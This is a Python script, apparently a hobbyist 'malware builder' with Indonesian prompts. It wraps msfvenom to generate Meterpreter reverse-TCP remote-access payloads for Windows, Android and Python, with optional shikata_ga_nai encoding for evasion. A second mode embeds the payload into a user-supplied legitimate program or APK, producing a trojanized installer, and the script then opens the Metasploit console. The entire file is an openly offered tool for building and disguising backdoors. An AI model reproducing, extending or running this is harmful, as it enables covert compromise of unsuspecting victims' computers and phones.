import os
import time
import datetime

class main():
    def get_datetime(self):
        get = datetime.datetime.now().strftime('%d %B %Y')
        return get
    def build_malware(self,host,port,output):
        time.sleep(5)
        print("==========MALWARE=BUILDER==========")
        print("|AUTHOR:ZeusSec1337               |")
        print("|Github:github.com/sidabutar1337  |")
        print("===================================")
        print("|           LIST TARGET           |")
        print("===================================")
        print("|1.Windows                        |")
        print("|2.Android                        |")
        print("|3.Python                         |")
        print("===================================")
        def start():
            try:
                menu = int(input("pilih: "))
                if menu == 1:
                    encode = input('kami ingin menggunakan encoder?(y/n) ')
                    if encode == "y":
                        os.system(f'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -e x86/shikata_ga_nai -o {output}.exe')
                    else:
                        os.system(f'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -o {output}.exe')
                elif menu == 2:
                    os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o {output}.apk')
                elif menu == 3:
                    os.system(f'msfvenom -p python/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o {output}.py')
                else:
                    print('Opps!!! Pilihan tidak ada silahkan pilih lagi')
                    return start()
            except ValueError:
                print('Opps!!! kesalahan harap gunakan angka')
                return start()
        if __name__=='__main__':
            start()
    def inject_malware(self,original,host,port,output):
        time.sleep(5)
        print("===========MALWARE=INJECTION==========")
        print("|AUTHOR:ZeusSec1337                  |")
        print("|github:github.com/sidabutar1337     |")
        print("======================================")
        print("|            LIST TARGET             |")
        print("======================================")        
        print("|1.Windows                           |")
        print("|2.Android                           |")
        print("======================================")
        def start():
            try:
                menu = int(input('pilih: '))
                if menu == 1:
                    encoder = input('kamu ingin menggunakan encoder?(y/n) ')
                    if encoder == 'y':
                        os.system(f'msfvenom -a x86 --platform windows -x {original} -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -e x86/shikata_ga_nai -o {output}.exe ')
                    else:
                        os.system(f'msfvenom -a x86 --platform windows -x {original} -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -o {output}.exe ')
                elif menu == 2:
                    os.system(f'msfvenom -x {original} -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o {output}.apk')
                else:
                    print('Opps!!! Pilihan tidak ada silahkan pilih lagi')
                    time.sleep(3)
                    return start()
            except ValueError:
                print('Opps!!! Kesalahan harap gunakan angka')
                time.sleep(3)
                return start()
        if __name__=="__main__":
            time.sleep(5)
            start()
    def start_builder(self):
        time.sleep(5)
        print("===========MALWARE=MENU===========")
        print("|AUTHOR:ZeusSec1337              |")
        print("|Github:github.com/sidabutar1337 |")                            
        print("==================================")
        print("|1.Buat Malware(RAT)             |")
        print("|2.Injeksi Software/APK(RAT)     |")
        print("==================================")
        def start():
            try:
                time = 'anda menggunakan alat ini pada',self.get_datetime()
                print(time)
                menu = int(input('Pilih: '))
                if menu == 1:
                    lhost = input('host: ')
                    lport = int(input('port: '))
                    print('untuk nama output jangan gunakan extensi')
                    out_put = input('nama output: ')
                    print('Tunggu....')
                    self.build_malware(lhost,lport,out_put)
                    msfconsole = input('ingin membuka metasploit console(y/n) ')
                    if msfconsole == 'y':
                        os.system('msfconsole')
                    else:
                        print('Semoga harimu menyenangkan!!')
                        print('Jangan lupa follow github saya')
                        os.system('xdg-open https://github.com/sidabutar1337')
                        print('Good Bye!!!')
                elif menu == 2:
                    print('Harap jangan gunakan extension')
                    ori_ginal = input('software/APK: ')
                    lhost = input('host: ')
                    lport = int(input('port: '))
                    out_put = input('output: ')
                    self.inject_malware(ori_ginal,lhost,lport,out_put)
                    msfconsole = input('ingin membuka metasploit console(y/n) ')
                    if msfconsole == 'y':
                        os.system('python script.py')
                        os.system('msfconsole')
                    else:
                        os.system('python script.py')
                        print('Semoga harimu menyenangkan!!')
                        print('Jangan lupa follow github saya')
                        os.system('xdg-open https://github.com/sidabutar1337')
                        print('Good Bye!!!')
                else:
                    print('Opps!!! Pilihan tidak ada silahkan pilih lagi')
                    return start()
            except ValueError:
                print('Harap gunakan angka untuk memilih dan menginput port')
                return start()
        if __name__=="__main__":
            start()
if __name__=='__main__':
    lets_start = main()
    lets_start.start_builder()

